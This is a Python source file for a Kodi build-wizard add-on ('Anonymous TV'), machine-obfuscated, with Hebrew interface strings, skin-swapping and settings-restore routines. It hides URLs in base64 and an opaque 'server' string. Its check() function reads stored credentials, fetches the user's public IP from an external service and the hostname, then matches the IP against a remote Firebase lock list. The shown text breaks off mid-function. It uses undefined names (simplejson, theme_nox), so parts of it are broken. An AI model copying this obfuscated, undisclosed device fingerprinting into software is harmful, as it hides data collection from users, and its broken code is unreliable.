import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:29
import shutil ,logging #line:30
KODI_VERSION =int (xbmc .getInfoLabel ("System.BuildVersion").split ('.',1 )[0 ])#line:31
import urllib #line:33
import re ,time #line:35
import subprocess ,socket #line:36
import json #line:37
import zipfile #line:38
import uservar #line:39
import fnmatch #line:41
import platform #line:42
import base64 #line:43
try :#line:44
    from urllib .request import urlopen #line:45
    from urllib .request import Request #line:46
except ImportError :#line:47
    from urllib2 import urlopen #line:48
    from urllib2 import Request #line:49
from shutil import copyfile #line:50
try :from sqlite3 import dbapi2 as database #line:51
except :from pysqlite2 import dbapi2 as database #line:52
import threading #line:53
from threading import Thread #line:54
from datetime import date ,datetime ,timedelta #line:56
try :#line:58
    from urllib .parse import parse_qsl #line:59
except ImportError :#line:60
    from urlparse import parse_qsl #line:61
if KODI_VERSION <=18 :#line:63
    que =urllib .quote_plus #line:64
    url_encode =urllib .urlencode #line:65
else :#line:66
    que =urllib .parse .quote_plus #line:67
    url_encode =urllib .parse .urlencode #line:68
if KODI_VERSION <=18 :#line:69
    unque =urllib .unquote_plus #line:70
else :#line:71
    unque =urllib .parse .unquote_plus #line:72
if KODI_VERSION <=18 :#line:73
    translatepath =xbmc .translatePath #line:74
else :#line:76
    translatepath =xbmcvfs .translatePath #line:77
socket .setdefaulttimeout (1500 )#line:79
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt #line:80
try :#line:81
 import wizard as wiz #line:82
except :#line:83
 from resources .libs import wizard as wiz #line:84
code_link ='empty'#line:85
ADDON_ID =uservar .ADDON_ID #line:86
ADDONTITLE =uservar .ADDONTITLE #line:87
ADDON =wiz .addonId (ADDON_ID )#line:88
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:89
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:90
DIALOG =xbmcgui .Dialog ()#line:91
DP =xbmcgui .DialogProgress ()#line:92
HOME =translatepath ('special://home/')#line:93
LOG =translatepath ('special://logpath/')#line:94
PROFILE =translatepath ('special://profile/')#line:95
ADDONS =os .path .join (HOME ,'addons')#line:96
USERDATA =os .path .join (HOME ,'userdata')#line:97
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:98
PACKAGES =os .path .join (ADDONS ,'packages')#line:99
ADDOND =os .path .join (USERDATA ,'addon_data')#line:100
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:101
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:102
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:103
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:104
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:105
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:106
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:107
DATABASE =os .path .join (USERDATA ,'Database')#line:108
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:109
ICON =os .path .join (ADDONPATH ,'icon.png')#line:110
ART =os .path .join (ADDONPATH ,'resources','art')#line:111
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:112
DP2 =xbmcgui .DialogProgressBG ()#line:113
SKIN =xbmc .getSkinDir ()#line:114
BUILDNAME =wiz .getS ('buildname')#line:115
DEFAULTSKIN =wiz .getS ('defaultskin')#line:116
DEFAULTNAME =wiz .getS ('defaultskinname')#line:117
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:118
BUILDVERSION =wiz .getS ('buildversion')#line:119
BUILDTHEME =wiz .getS ('buildtheme')#line:120
BUILDLATEST =wiz .getS ('latestversion')#line:121
INSTALLMETHOD =wiz .getS ('installmethod')#line:122
SHOW15 =wiz .getS ('show15')#line:123
SHOW16 =wiz .getS ('show16')#line:124
SHOW17 =wiz .getS ('show17')#line:125
SHOW18 =wiz .getS ('show18')#line:126
SHOWADULT =wiz .getS ('adult')#line:127
SHOWMAINT =wiz .getS ('showmaint')#line:128
AUTOCLEANUP =wiz .getS ('autoclean')#line:129
AUTOCACHE =wiz .getS ('clearcache')#line:130
AUTOPACKAGES =wiz .getS ('clearpackages')#line:131
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:132
AUTOFEQ =wiz .getS ('autocleanfeq')#line:133
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:134
INCLUDENAN =wiz .getS ('includenan')#line:135
INCLUDEURL =wiz .getS ('includeurl')#line:136
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:137
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:138
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:139
INCLUDEVIDEO =wiz .getS ('includevideo')#line:140
INCLUDEALL =wiz .getS ('includeall')#line:141
INCLUDEBOB =wiz .getS ('includebob')#line:142
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:143
INCLUDESPECTO =wiz .getS ('includespecto')#line:144
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:145
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:146
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:147
INCLUDESALTS =wiz .getS ('includesalts')#line:148
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:149
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:150
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:151
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:152
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:153
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:154
INCLUDEURANUS =wiz .getS ('includeuranus')#line:155
SEPERATE =wiz .getS ('seperate')#line:156
NOTIFY =wiz .getS ('notify')#line:157
NOTEDISMISS =wiz .getS ('notedismiss')#line:158
NOTEID =wiz .getS ('noteid')#line:159
NOTIFY2 =wiz .getS ('notify2')#line:160
NOTEID2 =wiz .getS ('noteid2')#line:161
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:162
NOTIFY3 =wiz .getS ('notify3')#line:163
NOTEID3 =wiz .getS ('noteid3')#line:164
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:165
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:166
NOTEID3 =0 if NOTEID3 ==""else int (NOTEID3 )#line:167
TRAKTSAVE =wiz .getS ('traktlastsave')#line:168
REALSAVE =wiz .getS ('debridlastsave')#line:169
LOGINSAVE =wiz .getS ('loginlastsave')#line:170
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:171
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:172
KEEPINFO =wiz .getS ('keepinfo')#line:173
KEEPSOUND =wiz .getS ('keepsound')#line:175
KEEPVIEW =wiz .getS ('keepview')#line:176
KEEPSKIN =wiz .getS ('keepskin')#line:177
KEEPADDONS =wiz .getS ('keepaddons')#line:178
KEEPSKIN2 =wiz .getS ('keepskin2')#line:179
KEEPSKIN3 =wiz .getS ('keepskin3')#line:180
KEEPTORNET =wiz .getS ('keeptornet')#line:181
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:182
KEEPPVR =wiz .getS ('keeppvr')#line:183
ENABLE =uservar .ENABLE #line:184
KEEPVICTORY =wiz .getS ('keepvictory')#line:185
KEEPTELEMEDIA =wiz .getS ('keeptelemedia')#line:186
KEEPTVLIST =wiz .getS ('keeptvlist')#line:187
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:188
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:189
KEEPHUBTV =wiz .getS ('keephubtv')#line:190
KEEPHUBVOD =wiz .getS ('keephubvod')#line:191
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:192
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:193
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:194
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:195
HARDWAER =wiz .getS ('action')#line:196
USERNAME =wiz .getS ('user')#line:197
PASSWORD =wiz .getS ('pass')#line:198
KEEPWEATHER =wiz .getS ('keepweather')#line:199
KEEPFAVS =wiz .getS ('keepfavourites')#line:200
KEEPSOURCES =wiz .getS ('keepsources')#line:201
KEEPPROFILES =wiz .getS ('keepprofiles')#line:202
KEEPADVANCED =wiz .getS ('keepadvanced')#line:203
KEEPREPOS =wiz .getS ('keeprepos')#line:204
KEEPSUPER =wiz .getS ('keepsuper')#line:205
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:206
KEEPTRAKT =wiz .getS ('keeptrakt')#line:207
KEEPREAL =wiz .getS ('keepdebrid')#line:208
KEEPRD2 =wiz .getS ('keeprd2')#line:209
KEEPLOGIN =wiz .getS ('keeplogin')#line:210
LOGINSAVE =wiz .getS ('loginlastsave')#line:211
DEVELOPER =wiz .getS ('developer')#line:212
THIRDPARTY =wiz .getS ('enable3rd')#line:213
THIRD1NAME =wiz .getS ('wizard1name')#line:214
THIRD1URL =wiz .getS ('wizard1url')#line:215
THIRD2NAME =wiz .getS ('wizard2name')#line:216
THIRD2URL =wiz .getS ('wizard2url')#line:217
THIRD3NAME =wiz .getS ('wizard3name')#line:218
THIRD3URL =wiz .getS ('wizard3url')#line:219
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:220
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:221
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:222
TODAY =date .today ()#line:223
TOMORROW =TODAY +timedelta (days =1 )#line:224
THREEDAYS =TODAY +timedelta (days =3 )#line:225
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:226
MCNAME =wiz .mediaCenter ()#line:227
EXCLUDES =uservar .EXCLUDES #line:228
SPEEDFILE =uservar .SPEEDFILE #line:229
APKFILE =uservar .APKFILE #line:230
YOUTUBETITLE =uservar .YOUTUBETITLE #line:231
YOUTUBEFILE =uservar .YOUTUBEFILE #line:232
from resources .libs .wizard import BL #line:233
ADDONFILE =uservar .ADDONFILE #line:234
ADVANCEDFILE =uservar .ADVANCEDFILE #line:235
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:236
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:237
NOTIFICATION =uservar .NOTIFICATION #line:238
NOTIFICATION2 =uservar .NOTIFICATION2 #line:239
NOTIFICATION3 =uservar .NOTIFICATION3 #line:240
HELPINFO =uservar .HELPINFO #line:241
ENABLE =uservar .ENABLE #line:242
HEADERMESSAGE =uservar .HEADERMESSAGE #line:243
AUTOUPDATE =uservar .AUTOUPDATE #line:244
WIZARDFILE =uservar .WIZARDFILE #line:245
HIDECONTACT =uservar .HIDECONTACT #line:246
SKINID18 =uservar .SKINID18 #line:247
SKINID18DDONXML =uservar .SKINID18DDONXML #line:248
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:249
SKINID17 =uservar .SKINID17 #line:250
SKINID17DDONXML =uservar .SKINID17DDONXML #line:251
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:252
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:253
CONTACT =uservar .CONTACT #line:254
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:255
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:256
HIDESPACERS =uservar .HIDESPACERS #line:257
TMDB_NEW_API =uservar .TMDB_NEW_API #line:258
COLOR1 =uservar .COLOR1 #line:259
COLOR2 =uservar .COLOR2 #line:260
THEME1 =uservar .THEME1 #line:261
THEME2 =uservar .THEME2 #line:262
THEME3 =uservar .THEME3 #line:263
THEME4 =uservar .THEME4 #line:264
THEME5 =uservar .THEME5 #line:265
TMDB_NEW_API2 ='bG9qaw=='#line:266
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:267
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:268
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:269
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:270
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:271
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:272
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:273
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:274
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:275
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:276
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:277
LOGFILES =wiz .LOGFILES #line:278
TRAKTID =traktit .TRAKTID #line:279
DEBRIDID =debridit .DEBRIDID #line:280
LOGINID =loginit .LOGINID #line:281
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:282
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:283
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:284
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:285
fullsecfold =translatepath ('special://home')#line:286
addons_folder =os .path .join (fullsecfold ,'addons')#line:288
remove_url =base64 .b64decode ('aHR0cDovL2tvZGkubGlmZS93aXphcmQvcmVtb3ZlYWRkb25zLnhtbA==').decode ('utf-8')#line:290
user_folder =os .path .join (translatepath ('special://masterprofile'),'addon_data')#line:292
remove_url2 =base64 .b64decode ('aHR0cDovL2tvZGkubGlmZS93aXphcmQvcmVtb3ZlYWRkb25zLnhtbA==').decode ('utf-8')#line:294
fanart =translatepath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:295
icon =translatepath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:296
IPTV18 =''#line:298
IPTVSIMPL18PC =''#line:299
if KODI_VERSION >18 :#line:301
    from urllib .parse import parse_qsl #line:302
    def trd_alive (O0OOO0O0OO0O0O00O ):#line:303
        return O0OOO0O0OO0O0O00O .is_alive ()#line:304
    class Thread (threading .Thread ):#line:305
       def __init__ (OOO000O0O00O00000 ,OO00O0O0O00OO0O00 ,*O0OO0O0OOO00O0OO0 ):#line:306
        super ().__init__ (target =OO00O0O0O00OO0O00 ,args =O0OO0O0OOO00O0OO0 )#line:307
       def run (OOO0O0000O0OO0O00 ,*O0000OO0OOOO0O000 ):#line:308
          OOO0O0000O0OO0O00 ._target (*OOO0O0000O0OO0O00 ._args )#line:310
          return 0 #line:311
else :#line:312
    from urlparse import parse_qsl #line:313
    def trd_alive (O0000O0O0OOOO000O ):#line:314
        return O0000O0O0OOOO000O .isAlive ()#line:315
    class Thread (threading .Thread ):#line:316
        def __init__ (O0000OO0OO00000O0 ,OOOO0OOOO000OOO0O ,*O0OOO00OOO00O00OO ):#line:317
            O0000OO0OO00000O0 ._target =OOOO0OOOO000OOO0O #line:319
            O0000OO0OO00000O0 ._args =O0OOO00OOO00O00OO #line:320
            threading .Thread .__init__ (O0000OO0OO00000O0 )#line:323
        def run (O00OO0O0O00OO0O00 ):#line:325
            O00OO0O0O00OO0O00 ._target (*O00OO0O0O00OO0O00 ._args )#line:327
oo ='/key.xml'#line:328
from resources .libs .wizard import ld #line:329
def MainMenu ():#line:331
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:333
def skinWIN ():#line:334
	idle ()#line:335
	OO00OO000000OOOO0 =glob .glob (os .path .join (ADDONS ,'skin*'))#line:336
	O000OO0OOOO00OOO0 =[];O0O00000O00OOO00O =[]#line:337
	for O00OO0OOOOO000OOO in sorted (OO00OO000000OOOO0 ,key =lambda OO00O00O000O0O0O0 :OO00O00O000O0O0O0 ):#line:338
		O00OO0O00OO0OOOOO =os .path .split (O00OO0OOOOO000OOO [:-1 ])[1 ]#line:339
		O0O000O000OOO0O00 =os .path .join (O00OO0OOOOO000OOO ,'addon.xml')#line:340
		if os .path .exists (O0O000O000OOO0O00 ):#line:341
			OOO0OOOO0OOOOOO0O =open (O0O000O000OOO0O00 )#line:342
			OO0OOO0O000000OO0 =OOO0OOOO0OOOOOO0O .read ()#line:343
			O00O0O0O00000O000 =parseDOM2 (OO0OOO0O000000OO0 ,'addon',ret ='id')#line:344
			OO00OOOOO0OO0OOO0 =O00OO0O00OO0OOOOO if len (O00O0O0O00000O000 )==0 else O00O0O0O00000O000 [0 ]#line:345
			try :#line:346
				OOOO0O000O0OOO00O =xbmcaddon .Addon (id =OO00OOOOO0OO0OOO0 )#line:347
				O000OO0OOOO00OOO0 .append (OOOO0O000O0OOO00O .getAddonInfo ('name'))#line:348
				O0O00000O00OOO00O .append (OO00OOOOO0OO0OOO0 )#line:349
			except :#line:350
				pass #line:351
	O000O00000OO0000O =[];O00O00O0OO0O000OO =0 #line:352
	O0O00OOOO00OO0O0O =["Current Skin -- %s"%currSkin ()]+O000OO0OOOO00OOO0 #line:353
	O00O00O0OO0O000OO =DIALOG .select ("Select the Skin you want to swap with.",O0O00OOOO00OO0O0O )#line:354
	if O00O00O0OO0O000OO ==-1 :return #line:355
	else :#line:356
		O000OOOOO000OO0OO =(O00O00O0OO0O000OO -1 )#line:357
		O000O00000OO0000O .append (O000OOOOO000OO0OO )#line:358
		O0O00OOOO00OO0O0O [O00O00O0OO0O000OO ]="%s"%(O000OO0OOOO00OOO0 [O000OOOOO000OO0OO ])#line:359
	if O000O00000OO0000O ==None :return #line:360
	for OO000O0O0O0O000O0 in O000O00000OO0000O :#line:361
		swapSkins (O0O00000O00OOO00O [OO000O0O0O0O000O0 ])#line:362
def currSkin ():#line:364
	return xbmc .getSkinDir ('Container.PluginName')#line:365
def swapSkins (O0000OO0O00OOO000 ,title ="Error"):#line:366
	OO00OO000000O000O ='lookandfeel.skin'#line:367
	OO0OOO0OO00O0OOOO =O0000OO0O00OOO000 #line:368
	O0O00OOOO000000OO =getOld (OO00OO000000O000O )#line:369
	OOOO00OOOO00OOOOO =OO00OO000000O000O #line:370
	setNew (OOOO00OOOO00OOOOO ,OO0OOO0OO00O0OOOO )#line:371
	O0O000OOOOO0O000O =0 #line:372
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O000OOOOO0O000O <100 :#line:373
		O0O000OOOOO0O000O +=1 #line:374
		xbmc .sleep (1 )#line:375
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:376
		xbmc .executebuiltin ('SendClick(11)')#line:377
	return True #line:378
def getOld (OOO0OO00OOOO00OOO ):#line:382
	try :#line:383
		OOO0OO00OOOO00OOO ='"%s"'%OOO0OO00OOOO00OOO #line:384
		O0000OOOOO0O0OO00 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OOO0OO00OOOO00OOO )#line:385
		OOO00OO0OOO0000OO =xbmc .executeJSONRPC (O0000OOOOO0O0OO00 )#line:387
		OOO00OO0OOO0000OO =simplejson .loads (OOO00OO0OOO0000OO )#line:388
		if 'result'in OOO00OO0OOO0000OO :#line:389
			if 'value'in OOO00OO0OOO0000OO ['result']:#line:390
				return OOO00OO0OOO0000OO ['result']['value']#line:391
	except :#line:392
		pass #line:393
	return None #line:394
server ='&eJzLKCkpKLbS10_JTM8s0StOTU3JyC8u0Ust1c_OT8nUL8-sSixK0S-pKNFPyklMztaryM0BAPI5E0I=$'#line:396
def setNew (O0O00000OO00OO00O ,O0OOOO00OO0O00OO0 ):#line:397
	try :#line:398
		O0O00000OO00OO00O ='"%s"'%O0O00000OO00OO00O #line:399
		O0OOOO00OO0O00OO0 ='"%s"'%O0OOOO00OO0O00OO0 #line:400
		O00O0OO0OOOO0O0O0 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O0O00000OO00OO00O ,O0OOOO00OO0O00OO0 )#line:401
		OO0OO00000O00OOOO =xbmc .executeJSONRPC (O00O0OO0OOOO0O0O0 )#line:403
	except :#line:404
		pass #line:405
	return None #line:406
def idle ():#line:407
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:408
def time_sync ():#line:409
 DP2 .create ('[B]מבצע סנכרון[/B]')#line:411
 for O0OOOOO000OO0OOOO in range (50 ,-1 ,-1 ):#line:412
       time .sleep (1 )#line:413
       DP2 .update (int ((50 -O0OOOOO000OO0OOOO )/50.0 *100 ),"[B]מסנכרן הרחבות                                 [/B]"+'\n'+"[B]אנא המתן...[/B]")#line:414
 DP2 .close ()#line:415
def resetkodi ():#line:417
        if xbmc .getCondVisibility ('system.platform.windows'):#line:418
            OOO00OO0OO000OO00 =xbmcgui .DialogProgress ()#line:419
            try :#line:420
                OOO00OO0OO000OO00 .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR yellow][B]ההתקנה הושלמה - Anonymous TV[/B][/COLOR]")#line:422
            except :#line:423
                OOO00OO0OO000OO00 .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות"+'\n'+''+'\n'+"[COLOR yellow][B]ההתקנה הושלמה - Anonymous TV[/B][/COLOR]")#line:425
            OOO00OO0OO000OO00 .update (0 )#line:426
            for OO00OOOO000O00O00 in range (5 ,-1 ,-1 ):#line:427
                time .sleep (1 )#line:428
                try :#line:429
                    OOO00OO0OO000OO00 .update (int ((5 -OO00OOOO000O00O00 )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (OO00OOOO000O00O00 ),'')#line:430
                except :#line:431
                    OOO00OO0OO000OO00 .update (int ((5 -OO00OOOO000O00O00 )/5.0 *100 ),"ההתקנה תסגר"+'\n'+'בעוד {0} שניות'.format (OO00OOOO000O00O00 )+'\n'+'[COLOR yellow][B]ההתקנה הושלמה - Anonymous TV[/B][/COLOR]')#line:432
                if OOO00OO0OO000OO00 .iscanceled ():#line:433
                    from resources .libs import win #line:434
                    return None ,None #line:435
            from resources .libs import win #line:436
        else :#line:437
            OOO00OO0OO000OO00 =xbmcgui .DialogProgress ()#line:438
            try :#line:439
                OOO00OO0OO000OO00 .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR yellow][B]ההתקנה הושלמה - Anonymous TV[/B][/COLOR]")#line:442
            except :#line:443
                OOO00OO0OO000OO00 .create ("ההתקנה תסגר אוטומטית","[COLOR yellow][B]ההתקנה הושלמה - Anonymous TV[/B][/COLOR]")#line:446
            OOO00OO0OO000OO00 .update (0 )#line:447
            for OO00OOOO000O00O00 in range (5 ,-1 ,-1 ):#line:448
                time .sleep (1 )#line:449
                try :#line:450
                    OOO00OO0OO000OO00 .update (int ((5 -OO00OOOO000O00O00 )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (OO00OOOO000O00O00 ),'')#line:451
                except :#line:452
                    OOO00OO0OO000OO00 .update (int ((5 -OO00OOOO000O00O00 )/5.0 *100 ),"ההתקנה תסגר"+'\n'+'בעוד {0} שניות'.format (OO00OOOO000O00O00 )+'\n'+'[COLOR yellow][B]ההתקנה הושלמה - Anonymous TV[/B][/COLOR]')#line:453
                if OOO00OO0OO000OO00 .iscanceled ():#line:454
                    from resources .libs import android #line:456
                    return None ,None #line:457
            from resources .libs import android #line:458
def testcommand ():#line:461
    O0O0O0O0000O0000O =os .path .join (translatepath ("special://home/"),"userdata","addon_data","plugin.program.Anonymous","settings.xml")#line:462
    OOO0000O00O0O0O0O =os .path .join (translatepath ("special://home/"),"userdata","addon_data","plugin.program.Anonymous","settings_backup.xml")#line:463
    if KODI_VERSION <=18 :#line:465
        OOO0O0OO00OO00O00 =open (O0O0O0O0000O0000O ,'r')#line:467
        O0OOO0O0O0OO0O000 =OOO0O0OO00OO00O00 .read ()#line:468
        OOO0O0OO00OO00O00 .close ()#line:469
    else :#line:470
        OOO0O0OO00OO00O00 =open (O0O0O0O0000O0000O ,'r',encoding ='utf-8')#line:471
        O0OOO0O0O0OO0O000 =OOO0O0OO00OO00O00 .read ()#line:472
        OOO0O0OO00OO00O00 .close ()#line:473
    if O0OOO0O0O0OO0O000 =='':#line:475
            xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','הגדרת הורדת כתובית בוצעה בהצלחה')))#line:476
            copyfile (OOO0000O00O0O0O0O ,O0O0O0O0000O0000O )#line:477
def backup_setting_file ():#line:479
    O0OOO000OOOO0O0OO =os .path .join (translatepath ("special://home/"),"userdata","addon_data","plugin.program.Anonymous","settings.xml")#line:480
    OOOO0O0OOO0000O00 =os .path .join (translatepath ("special://home/"),"userdata","addon_data","plugin.program.Anonymous","settings_backup.xml")#line:481
    copyfile (O0OOO000OOOO0O0OO ,OOOO0O0OOO0000O00 )#line:483
def backtokodi ():#line:484
    if os .path .exists (os .path .join (ADDONS ,'skin.Premium.mod')):#line:485
        if KODIV >=17 and KODIV <18 :#line:486
            OOO00O0000000OOOO =os .path .join (translatepath ("special://home/addons/plugin.program.Anonymous/skinfix"),"17","guisettings.xml")#line:487
            OO0OOOOO0000000OO =os .path .join (translatepath ("special://home/"),"userdata","guisettings.xml")#line:488
            copyfile (OOO00O0000000OOOO ,OO0OOOOO0000000OO )#line:489
            OOO00O0000000OOOO =os .path .join (translatepath ("special://home/addons/plugin.program.Anonymous/skinfix"),"17","settings.xml")#line:491
            OO0OOOOO0000000OO =os .path .join (translatepath ("special://home/"),"userdata","addon_data","skin.Premium.mod","settings.xml")#line:492
            copyfile (OOO00O0000000OOOO ,OO0OOOOO0000000OO )#line:494
            os ._exit (1 )#line:495
        if KODIV >=18 and KODIV <19 :#line:497
            OOO00O0000000OOOO =os .path .join (translatepath ("special://home/addons/plugin.program.Anonymous/skinfix"),"18","guisettings.xml")#line:498
            OO0OOOOO0000000OO =os .path .join (translatepath ("special://home/"),"userdata","guisettings.xml")#line:499
            copyfile (OOO00O0000000OOOO ,OO0OOOOO0000000OO )#line:500
            OOO00O0000000OOOO =os .path .join (translatepath ("special://home/addons/plugin.program.Anonymous/skinfix"),"17","settings.xml")#line:502
            OO0OOOOO0000000OO =os .path .join (translatepath ("special://home/"),"userdata","addon_data","skin.Premium.mod","settings.xml")#line:503
            copyfile (OOO00O0000000OOOO ,OO0OOOOO0000000OO )#line:505
            os ._exit (1 )#line:506
        if KODIV >=19 and KODIV <21 :#line:507
            OOO00O0000000OOOO =os .path .join (translatepath ("special://home/addons/plugin.program.Anonymous/skinfix"),"19","guisettings.xml")#line:508
            OO0OOOOO0000000OO =os .path .join (translatepath ("special://home/"),"userdata","guisettings.xml")#line:509
            copyfile (OOO00O0000000OOOO ,OO0OOOOO0000000OO )#line:510
            OOO00O0000000OOOO =os .path .join (translatepath ("special://home/addons/plugin.program.Anonymous/skinfix"),"17","settings.xml")#line:512
            OO0OOOOO0000000OO =os .path .join (translatepath ("special://home/"),"userdata","addon_data","skin.Premium.mod","settings.xml")#line:513
            copyfile (OOO00O0000000OOOO ,OO0OOOOO0000000OO )#line:515
            os ._exit (1 )#line:516
    else :#line:517
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד לא מותקן.[/COLOR]'%COLOR2 )#line:518
def read_skin (O0O0OOO000OOOO00O ):#line:519
    from resources .libs import firebase #line:520
    firebase =firebase .FirebaseApplication (theme_nox ,None )#line:521
    O0O0000O000O0O00O =firebase .get ('/',None )#line:522
    if O0O0OOO000OOOO00O in O0O0000O000O0O00O :#line:523
        return O0O0000O000O0O00O [O0O0OOO000OOOO00O ]#line:524
    else :#line:525
        return {}#line:526
def check (wiz_up =False ):#line:527
    import json ,platform #line:528
    O0O00OOO0OO00OO0O =ADDON .getSetting ("user")#line:529
    OOO000O0OOOOO0OO0 =ADDON .getSetting ("pass")#line:530
    OOO0OO0O0OO0O0000 =[]#line:535
    OOOOOO000O00O0O00 =0 #line:536
    OOO000O0OOOOO0OO0 =(ADDON .getSetting ("pass"))#line:537
    try :#line:538
        OOOOO0OOO0OOOO00O =read_skin ('lock_install')#line:539
        for OOOO00OO0O000OO00 in OOOOO0OOO0OOOO00O :#line:540
            O00O000OOOO0OOOOO =OOOOO0OOO0OOOO00O [OOOO00OO0O000OO00 ]#line:541
            OOO0OO0O0OO0O0000 .append ((O00O000OOOO0OOOOO ['lock_install']))#line:542
    except Exception as O0OO00000OO000O0O :#line:543
              logging .warning ('בעיה ב firebase    !!!!!!!!!!!!!!!!!!!!!!     '+str (O0OO00000OO000O0O ))#line:544
    OOOOO000O00O0OO0O =urlopen ('https://api.ipify.org/?format=json').read ()#line:546
    OOO0OO0O000000OOO =str (json .loads (OOOOO000O00O0OO0O )['ip'])#line:547
    O0O0O00O0OOOOOOOO =platform .uname ()#line:548
    OOOO00OOO00000000 =O0O0O00O0OOOOOOOO [1 ]#line:549
    O00OOOOOO0O000OOO =''#line:551
    O0OO0000OO0OO0000 =(ADDON .getSetting ("action"))#line:552
    O00O000OOOOO00O00 =''#line:553
    if wiz_up :#line:554
        O00O000OOOOO00O00 ='wizard_update'#line:555
    for OO00O00OO00OO0000 in OOO0OO0O0OO0O0000 :#line:556
        if OO00O00OO00OO0000 ==OOO0OO0O000000OOO :#line:557
            O00OOOOOO0O000OOO ='ip'#line:558
            OOOOOO000O00O0O00 =1 #line:559
            break #line:560
